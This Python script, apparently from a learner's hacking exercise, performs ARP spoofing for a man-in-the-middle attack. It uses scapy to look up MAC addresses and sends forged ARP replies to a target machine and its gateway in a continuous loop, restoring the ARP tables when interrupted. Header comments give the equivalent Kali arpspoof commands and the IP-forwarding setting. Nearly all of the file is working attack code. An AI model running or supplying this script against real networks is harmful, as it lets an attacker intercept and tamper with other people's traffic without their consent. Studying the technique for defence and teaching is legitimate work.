# man in the middle attack

# to do something like this kali has prebuilt tool called arpspoof
# just goto terminal and find the ip address of ur machine, target machine and the router
# this can be done
# > arp -a
# > arpspoof -i etho0(network interface) -t (target ip(machine)) (telling target(router) who am i(machine) (bluff))
# > arpspoof -i etho0(network interface) -t (target ip(router)) (telling target(machine) who am i(router) (bluff))
# > echo 1 > /proc/sys/net/ipv4/ip_forward

import scapy.all as scapy
import time
#import sys # not required in py3

#refer net_scanner.py for scan(ip) function

target_ip = "someip...take input"
gateway_ip = "someip...take input"

def get_mac(ip):
    arp_req = scapy.ARP()
    #print(arp_req.summary())
    #arp_req.show()
    arp_req.pdst = ip # or arp_req = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP()) # its just to list all the variabkles and objects that we can access of a particular class
    # scapy.arping(ip);
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_brdcast = broadcast/arp_req
    answered_list, unanswered = scapy.srp(arp_brdcast, timeout=1, verbose=False) #verbose is set t false to hide extra data
    return answered_list[0][1].hwsrc

    # result_list = []
    # for i in answered_list:
    #     dictio = {"ip": i[1].psrc, "mac": i[1].hwsrc}
    #     result_list.append(dictio)
    # return result_list

def spoof(target_ip,spoof_ip):
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    # to get more info just do scapy.ls(scapy.ARP)
    # op=1 means receive mode but we wanna send it so op=2

    print(packet.show())
    print(packet.summary())
    scapy.send(packet, verbose=False) # set verbose false as it will turn the auto print statemnst false

def restore(destination_ip,source_ip):
    dest_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


packets_sent = 0
try:
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        print("\r[+] Packets Sent " + str(packets_sent),end="") # we put a comma to print on same line
        #\r says i want u to always start from the start of screen
        # sys.stdout.flush() # telling python not to store output in buffer but print # not required in py3
        packets_sent+=2
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected ctrl + c......restoring ARP tables...")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)

#todo ~echo 1 > /proc/sys/net/ipv4/ip_forward to allow kali forward the requests